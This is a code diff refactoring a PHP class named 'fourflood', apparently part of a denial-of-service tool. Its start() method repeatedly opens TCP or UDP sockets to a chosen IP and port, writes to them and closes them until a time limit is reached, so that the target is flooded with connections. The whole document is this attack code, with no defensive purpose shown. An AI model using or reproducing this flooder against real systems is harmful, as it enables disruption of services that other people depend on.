@@ -1,19 +1,30 @@
 <?php
+include_once "../header.php";
 class fourflood{
-	function tcpudp($ip, $port, $timedout, $starttime, $method, $lenght, $max_time, $exec_time){
+	public $ip;
+	public $port;
+	public $timedout;
+	public $max_time;
+	public $method;
+	public function __construct($ip, $port, $timedout, $max_time, $method) {
+		$this->ip = $ip;
+		$this->port = $port;
+		$this->timedout = $timedout;
+		$this->max_time = $max_time;
+		$this->method = $method;
+	}
+	function start(){
+		$packet = 0;
 		while(1){
-			try{
-			$packets++; 
-						if(time() > $max_time){
-							output($packets, $starttime, $exec_time, $lenght);
-							break; 
-						}
-				$fp = fsockopen("$method://".$ip, $port, $errno, $errstr, $timedout); 
-				fwrite($fp, $out); 
-				fclose($fp);
-			}catch (Exception $e){
-				echo $e;
+			$packet++; 
+			if(time() > $this->max_time){
+				return $packet;
+				break; 
 			}
+			$fp = fsockopen($this->method."://".$this->ip, $this->port, $errno, $errstr, $this->timedout); 
+			fwrite($fp, $out); 
+			fclose($fp);
+
 		}
 	}
 }
